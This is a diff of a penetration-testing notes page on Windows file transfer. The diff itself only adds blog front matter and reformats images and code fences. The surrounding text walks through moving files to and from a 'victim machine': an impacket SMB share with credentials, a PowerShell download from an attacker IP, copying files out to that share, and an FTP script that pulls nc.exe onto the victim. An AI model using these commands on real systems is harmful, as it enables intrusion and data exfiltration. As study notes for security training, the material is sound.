@@ -1,3 +1,13 @@
+---
+description: >-
+  Windows File Transfer various techniques
+title: Windows File Transfer              # Add title here
+date: 2023-01-29 08:00:00 -0600                           # Change the date to match completion date
+categories: [03 File Transfer, Windows - File Transfer]                     # Change Templates to Writeup
+tags: [file transfer, windows upload, windows download]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
+show_image_post: false                                    # Change this to true
+#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
+---
 ### Upload
 
 Netcat execution for windows.
@@ -17,9 +27,9 @@ Then you can access directly to this folder from the file explorer itself, by pu
 ```bash
 \\192.168.119.186\shareFolder
 ```
-![[Pasted image 20220907003801.png]]
+![Description](/assets/img/Pasted image 20220907003801.png)
 If by any chance we get the following error:
-![[Pasted image 20230129045937.png]]
+![Description](/assets/img/Pasted image 20230129045937.png)
 We need to create a share with authentication to mount our share in the victim machine as another NFS:
 ```bash
 impacket-smbserver shareFolder $(pwd) -smb2support -username shuciran -password shuciran123
@@ -42,7 +52,7 @@ powershell Invoke-WebRequest -Uri http://10.10.119.207/GetCLSID.ps1 -Outfile Get
 
 ### SMB
 To download files from the victim machine all you need to do is to copy within the SMB Shared Folder:
-```cmd
+```powershell
 copy <file> \\192.168.119.186\shareFolder
 ```
 
@@ -57,7 +67,7 @@ We have already installed and configured Pure-FTPd on our Kali machine, but we w
 kali@kali:~$ sudo systemctl restart pure-ftpd
 ```
 Next execute following command:
-```cmd
+```powershell
 echo open 192.168.243.142 21> ftp.txt && echo USER offsec>> ftp.txt && echo password>> ftp.txt && echo bin >> ftp.txt && echo GET nc.exe >> ftp.txt && echo bye >> ftp.txt
 ```
 Initiate FTP with commands on it:
